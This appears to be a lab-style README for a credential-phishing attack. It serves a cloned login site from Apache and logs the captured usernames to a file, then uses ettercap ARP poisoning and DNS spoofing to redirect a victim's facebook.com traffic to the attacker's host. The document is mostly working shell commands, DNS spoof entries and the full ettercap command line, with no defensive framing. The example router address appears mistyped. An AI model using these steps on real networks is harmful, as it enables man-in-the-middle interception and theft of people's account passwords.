## Setup
### Attacker 
- OS: Kali Linux

### Victim 
- OS: Windows*


## Deploying Phishing Sites

```bash=
cd site
cp * /var/www/html/
cd /var/www/html/
mkdir data
cd data
touch usernames.txt  
cd ..
chmod -R 777 .     
cd ~
service apache2 start
tail -f /var/www/html/data/usernames.txt    
```
### Open browser 
- the attacker can test by accessing 127.0.0.1 on the browser
- the victim can also connect to a real domain login site (access 10.0.2.4 on the browser)

### ettercap's configurations: 

```bash
vim /etc/ettercap/etter.conf 
```
- modify ec_uid, ec_gid = 0
- uncomment linux setting
  
```bash
vim /etc/ettercap/etter.dns 
```
- add your_host.com into target list
```
your_host.com      A   [your_server_attack_IP]
*.your_host.com    A   [your_server_attack_IP]
www.your_host.com  A   [your_server_attack_IP]
```

### ettercap DNS spoofing
```bash=
ettercap -G 
```
- stop unified sniffing 
- scan the hosts
- add the victims' ip address to target 1
- start MITM attacks: ARP poisoning
- enable dns_spoof plugin

#### ![image](img/DNS.png)
- start unified sniffing 

### victim is spoofed
- open cmd
```bash=
nslookup facebook.com
ping facebook.com
```
- the ip address of facebook.com becomes 10.0.2.4
- open the browser in private mode and access facebook.com
- login!
- the account and password are shown on ettercap and usernames.txt 


# console: 
```bash
ettercap -T -i your_interface_monitoring -M arp:remote -P dns_spoof /your_gateway_listener// /victim_IP//
```

Example scenario:
- If your interface is eth0, the router is `92.168.1.1`, and the victim is `192.168.1.50`

